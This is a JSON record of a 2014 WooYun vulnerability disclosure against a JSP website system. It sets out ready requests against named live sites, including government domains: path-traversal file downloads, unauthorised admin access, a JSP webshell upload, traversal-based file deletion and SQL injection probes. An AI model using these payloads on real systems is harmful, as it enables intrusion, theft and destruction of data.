{"id": 402, "wybug_id": "wooyun-2014-070106", "wybug_title": "某系统任意文件下载/任意上传/任意删除/越权操作/SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-07-29 16:45", "wybug_open_date": "2014-10-27 16:46", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向公众公开  简要描述： 某系统任意文件下载/任意上传/任意删除/越权操作/SQL注入漏洞 详细说明：  关键字：\n技术支持：绍兴深蓝软件开发有限公司\n0x001、任意文件下载\nhttp://www.lqzjz.com.cn/download.jsp?path=../WEB-INF/web.xml\n\n\n看看web.xml的内容：\n\n0x002、越权访问（后台直接访问）\n后台：http://www.lqzjz.com.cn/houtai/main.jsp附件管理：http://www.lqzjz.com.cn/houtai/masterfujian.jsp?rowno=643\n\n\n附件管理：\n\n0x003、任意文件上传从上面的附件管理处可以看出，这里有上传功能\nhttp://www.lqzjz.com.cn/houtai/uploadfujian.jsp?formid=null&rowid=643\n这里我们来传一个就是jsp版的shell\n\n返回附件管理页面，看到我们的jsp shell已经成功上传了：\n\n但是这里我们不知道我们的shell地址不过，从download.jsp的下载功能可以得知，可以直接下载改shell文件，那么具体路径看到是已知的于是我们来利用任意文件下载漏洞下载download.jsp文件：\nhttp://www.lqzjz.com.cn/download.jsp?path=../download.jsp\n看看download.jsp文件内容：\n<%@ page import=\"java.io.*\" %><%@ page language=\"java\" contentType=\"text/html; charset=GBK\"  %><%try{    String path = request.getParameter(\"path\");    path = request.getRealPath(\"/\")+\"viewfiles\\\\\"+path;      String filename = path.substring(path.lastIndexOf(\"\\\\\")+1);    //filename = new String(filename.getBytes(\"GBK\"),\"ISO8859_1\");     path = new String(path.getBytes(\"ISO8859_1\"));    response.setHeader(\"Content-disposition\",\"attachment; filename=\"+filename);    FileInputStream fis = new FileInputStream(path);    OutputStream os = response.getOutputStream();    int byteRead;    while((-1) != (byteRead = fis.read()))    {        os.write(byteRead);    }    os.close();    if (fis != null)    {        fis.close();    }}catch(Exception e){    System.out.print(\"download.jsp:\"+e);}%>\n明显得知，是在根目录下的viewfiles目录下最后得知我们的shell地址：\nhttp://www.lqzjz.com.cn/viewfiles/fujian/191.jsp\n而且是system权限：\n\n0x004、任意文件删除\nhttp://www.lqzjz.com.cn/houtai/deletefujian.jsp?rowno=252&path=fujian\\193.txt\n我们来删除根目录下的test.txt\n\n删除链接：\nhttp://www.lqzjz.com.cn/houtai/deletefujian.jsp?rowno=252&path=fujian\\..\\..\\test.txt\n成功删除：\n\n0x005、多处SQL注入第一处：\nhttp://www.lqzjz.com.cn/houtai/masterfujian.jsp?rowno=400 and 1=1http://www.lqzjz.com.cn/houtai/masterfujian.jsp?rowno=400 and 1=2\n第二处：\nhttp://www.lqzjz.com.cn/houtai/modi.jsp?type=1&rowid=652 and 1=1http://www.lqzjz.com.cn/houtai/modi.jsp?type=1&rowid=652 and 1=2\n第三处：\nhttp://www.szjczx.com/xxcontent.jsp?rowid=123 and 1=1http://www.szjczx.com/xxcontent.jsp?rowid=123 and 1=2\n第一处SQL注入证明：\n\n   漏洞证明：  案例证明：http://www.szjczx.com/download.jsp?path=../WEB-INF/web.xmlhttp://www.sxjzj.gov.cn/download.jsp?path=../WEB-INF/web.xmlhttp://www.ptzjz.com/download.jsp?path=../WEB-INF/web.xmlhttp://www.hujsjd.com/download.jsp?path=../WEB-INF/web.xmlhttp://www.lqzjz.com.cn/download.jsp?path=../WEB-INF/web.xmlhttp://www.sxazj.gov.cn/download.jsp?path=../WEB-INF/web.xmlhttp://nbzhzjz.com/download.jsp?path=../WEB-INF/web.xmlhttp://www.pjzjz.cn/download.jsp?path=../WEB-INF/web.xml   修复方案：  问题太大了，换个版本吧。   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-03 09:03 厂商回复：   最新状态： 2014-08-04：CNVD确认并复现所述情况，已经转由CNCERT下发给浙江分中心处置。  ", "replys": "漏洞评价：\n评论\n     2014-07-29 16:49 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  审计牛    \n     2014-07-29 17:05 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  只要标题打的屌，首页肯定是要的    \n     2014-07-29 17:06 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @U神 下次我也把标题打长一点了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}